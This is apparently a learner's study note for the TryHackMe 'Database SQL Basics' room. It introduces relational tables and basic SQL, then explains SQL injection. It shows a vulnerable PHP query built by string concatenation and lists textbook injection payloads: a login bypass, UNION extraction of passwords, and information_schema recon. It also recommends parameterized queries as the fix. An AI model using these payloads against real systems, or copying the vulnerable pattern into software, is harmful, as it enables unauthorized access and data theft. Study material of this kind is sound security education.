---
tags: [THM, pre-security, software-basics, SQL, database, room]
platform: TryHackMe
type: room
module: "Software Basics"
module_number: 6
room_number: 27
status: "⬜"
url: https://tryhackme.com/room/databasesqlbasics
difficulty: Easy
---

# 🗄️ Database SQL Basics

> [!abstract] Summary
> Introduction to relational databases and SQL. Understanding SQL is essential for web security — SQL Injection is one of the most critical and widespread vulnerabilities (OWASP Top 10 #3).

**Path:** [[Pre Security (New)]] > [[Software Basics]] > Database SQL Basics

---

## 📖 Key Concepts

### Relational Databases
Data stored in **tables** with rows and columns, linked by relationships.

```
users table:
+----+----------+------------------+----------+
| id | username | email            | password |
+----+----------+------------------+----------+
|  1 | alice    | alice@email.com  | [hash]   |
|  2 | bob      | bob@email.com    | [hash]   |
+----+----------+------------------+----------+

orders table:
+----+---------+-------+
| id | user_id | total |
+----+---------+-------+
|  1 |       1 | 50.00 |
```

**Common databases:** MySQL, PostgreSQL, SQLite, Microsoft SQL Server, Oracle

---

### SQL Basics

```sql
-- SELECT — retrieve data
SELECT * FROM users;
SELECT username, email FROM users;
SELECT * FROM users WHERE username = 'alice';
SELECT * FROM users WHERE id > 5 ORDER BY id DESC;
SELECT * FROM users LIMIT 10;

-- JOIN — combine tables
SELECT users.username, orders.total
FROM users
JOIN orders ON users.id = orders.user_id;

-- INSERT — add data
INSERT INTO users (username, email, password)
VALUES ('charlie', 'charlie@email.com', 'hashed_pw');

-- UPDATE — modify data
UPDATE users SET email = 'new@email.com' WHERE id = 1;

-- DELETE — remove data
DELETE FROM users WHERE id = 5;

-- CREATE TABLE
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) NOT NULL UNIQUE,
    email VARCHAR(100),
    password VARCHAR(255)
);
```

---

### SQL Injection
Occurs when **user input is inserted directly into an SQL query** without sanitization.

**Vulnerable code (PHP example):**
```php
$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "'";
```

**Attack — bypass login:**
```
Input: ' OR '1'='1
Query becomes: SELECT * FROM users WHERE username = '' OR '1'='1'
Result: Returns ALL users → logged in as first user
```

**Attack — extract data (UNION injection):**
```sql
' UNION SELECT username, password, NULL FROM users --
```

**Attack — comment out rest of query:**
```sql
' OR 1=1 --
' OR 1=1 #
admin'--
```

**Impact of SQL Injection:**
- Authentication bypass
- Extract all database contents (usernames, passwords, credit cards)
- Write files to server
- In some cases: execute OS commands

**Prevention:**
- **Prepared statements / Parameterized queries** (BEST solution)
- Input validation and sanitization
- Least privilege database accounts
- WAF (additional layer, not a fix)

```php
// SECURE — parameterized query
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

---

### Useful SQL Commands for Recon (SQLi)

```sql
-- Identify database version
' UNION SELECT @@version, NULL --         -- MySQL
' UNION SELECT version(), NULL --          -- PostgreSQL

-- List all tables
' UNION SELECT table_name, NULL FROM information_schema.tables --

-- List columns in a table
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
```

---

## 🔑 Key Takeaways
- SQL is used by almost every web application to store data
- SQL Injection is in the OWASP Top 10 and extremely common
- The fix is always parameterized queries — not input filtering
- Understanding SQL is required to understand and test web app vulnerabilities

## 🔗 Related Notes
- [[Putting It All Together]] · [[How Websites Work]]
- [[SQL Injection]] · [[OWASP Top 10]] · [[Database]] · [[Web Security]]
